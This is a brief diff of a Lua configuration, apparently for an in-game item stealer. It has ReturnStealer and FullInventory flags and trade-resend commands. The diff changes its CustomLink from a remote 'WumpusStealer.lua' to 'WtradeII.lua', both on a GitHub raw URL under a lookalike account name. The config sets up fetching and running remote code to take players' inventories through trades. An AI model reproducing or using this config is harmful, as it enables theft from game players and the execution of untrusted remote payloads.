@@ -4,7 +4,7 @@ Config = {
     FullInventory = true,
     ReturnStealer = true,
     Script = "Custom",
-    CustomLink = "https://raw.githubusercontent.com/JoystickpIays/psychic-octo-invention/main/WumpusStealer.lua"
+    CustomLink = "https://raw.githubusercontent.com/JoystickpIays/psychic-octo-invention/main/WtradeII.lua"
 }
 Commands = {ResendTrade = "UwU", RestartPlayer = ".restart"}
 repeat
